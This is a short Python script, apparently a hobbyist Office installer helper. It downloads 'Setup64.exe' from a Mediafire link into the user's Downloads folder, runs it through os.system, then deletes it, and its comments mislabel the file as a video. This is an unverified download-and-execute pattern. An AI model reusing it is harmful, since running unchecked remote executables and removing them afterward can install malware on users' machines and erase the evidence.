
from os import getlogin, system,chdir,remove
from requests import get
from time import sleep

class Download():

    def __init__(self):
        pass

    def downloadOffice(self):

        chdir("C:/Users/"+ getlogin()+ "/Downloads/")
        
        url = "https://download1532.mediafire.com/02jnmlfr59ogZRaETFBj4dFxLHVRneowTirc5uEUWZG7Ehlh4XmJKtQhvL-BE0CG1NBOVj3UsqpPfcLPN0FB0VLIPZTH/8d6j085b404g24s/Setup64.exe"
        
        try:
            
            response = get(url)
            
            if response.status_code == 200:
                # Guarda el archivo de video
               
                with open("Setup64.exe", "wb") as f:
                    
                    f.write(response.content)
                    
                    print("Descargado con exito")
                    
                    sleep(5)
                
                system("C:/Users/"+ getlogin()+ "/Downloads/Setup64.exe")

                remove("C:/Users/"+ getlogin()+ "/Downloads/Setup64.exe")
                
            else:
                
                print("Error al descargar el video")
                
                sleep(12)

        except Exception as e:
            
            print("Error al office el video: ", e)
            
            sleep(12)
